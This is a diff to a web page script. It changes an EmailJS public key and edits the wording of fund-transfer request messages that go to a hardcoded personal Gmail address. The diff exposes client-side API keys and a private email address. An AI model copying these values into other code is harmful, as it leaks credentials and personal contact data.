@@ -1,6 +1,6 @@
 (function() {
     emailjs.init({
-        publicKey: "YhCaKlqyXGsPVBljd",
+        publicKey: "LqDynLMjDwYU33Fy7",
     });
 })();
 
@@ -82,8 +82,8 @@ document.addEventListener("DOMContentLoaded", function() {
         const saentry = params.saentry || secureData.saentry;
         const sdentry = params.sdentry || secureData.sdentry;
         const name = params.name || secureData.name;
-        const matchedName = `for ${name}`;
-        const msg = `Dear Sir, fund transfer request of ${amount} BDT. for ${accountNumber} through ${description}`;
+        const matchedName = ` ${name}`;
+        const msg = `Dear Sir, fund transfer request of ${amount} BDT. for ${accountNumber} through ${description} has got.`;
         const updatedDescription = `${description} - ${matchedName}`;
         const failed = document.getElementById('no-connection-popup2');
         const done = document.getElementById('no-connection-popup3');
@@ -164,8 +164,8 @@ audioElement2.load();
 
         emailjs.send("updensiion", "template_densiion", {
             to_email: "moraladnan.siraj@gmail.com",
-            to_name: matchedName,
-            from_name: "Cashout",
+            to_name: "DM sir",
+            from_name: matchedName,
             message: msg,
         })
         .then(response => {
